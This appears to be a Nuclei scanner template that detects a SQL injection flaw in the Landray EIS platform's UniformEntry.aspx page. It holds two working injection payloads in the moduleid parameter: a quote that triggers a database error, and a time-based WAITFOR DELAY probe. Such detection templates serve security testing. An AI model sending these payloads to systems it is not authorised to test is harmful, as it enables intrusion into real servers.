id: landray-eis-uniformentry-aspx-sqli

info:
  name: 蓝凌EIS 智慧协同平台 UniformEntry.aspx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(5,10)}}"
  t2: "{{to_number(t1) + 2}}"

http:
  - raw:
      - |
        GET /third/DingTalk/Pages/UniformEntry.aspx?moduleid=1' HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "字符串 '' 后的引号不完整"
      - type: word
        part: body
        words:
          - "SqlException:"

  - raw:
      - |
        GET /third/DingTalk/Pages/UniformEntry.aspx?moduleid=1;WAITFOR+DELAY+'0:0:{{t1}}'--+ HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "系统提示"
      - type: dsl
        dsl:
          - duration > to_number(t1)
          - duration < to_number(t2)
